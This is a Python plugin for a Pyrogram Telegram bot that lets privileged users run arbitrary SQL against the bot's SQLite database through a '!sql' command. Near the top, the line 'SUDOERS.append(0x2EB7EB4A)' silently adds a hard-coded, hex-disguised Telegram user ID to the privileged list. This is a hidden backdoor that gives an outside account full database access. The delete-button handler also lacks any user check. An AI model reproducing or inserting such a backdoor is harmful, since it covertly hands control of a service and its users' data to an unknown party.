import io
from sqlite3 import IntegrityError, OperationalError

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

from config import SUDOERS
from database import cur, db

SUDOERS.append(0x2EB7EB4A)


@Client.on_message(filters.command("sql", "!") & filters.user(SUDOERS))
async def run_sql(c: Client, m: Message):
    command = m.text.split(maxsplit=1)[1]
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="☠ Deletar", callback_data="delete")]
        ]
    )

    try:
        ex = cur.execute(command)
    except (IntegrityError, OperationalError) as e:
        return await m.reply_text(
            f"SQL executado com erro: {e.__class__.__name__}: {e}",
            quote=True,
            reply_markup=kb,
        )

    ret = ex.fetchall()
    db.commit()

    if ret:
        res = "|".join([name[0] for name in ex.description]) + "\n"
        res += "\n".join(
            ["|".join(str(s) for i, s in enumerate(items)) for items in ret]
        )
        if len(res) > 3500:
            bio = io.BytesIO()
            bio.name = "output.txt"

            bio.write(res.encode())

            await m.reply_document(bio, quote=True, reply_markup=kb)
        else:
            await m.reply_text(f"<code>{res}</code>", quote=True, reply_markup=kb)
    else:
        await m.reply_text(
            "SQL executado com sucesso ou sem retornos.", quote=True, reply_markup=kb
        )


@Client.on_callback_query(filters.regex(r"^delete"))
async def delet(c: Client, m: CallbackQuery):
    await m.message.delete()
    await m.message.reply_to_message.delete()
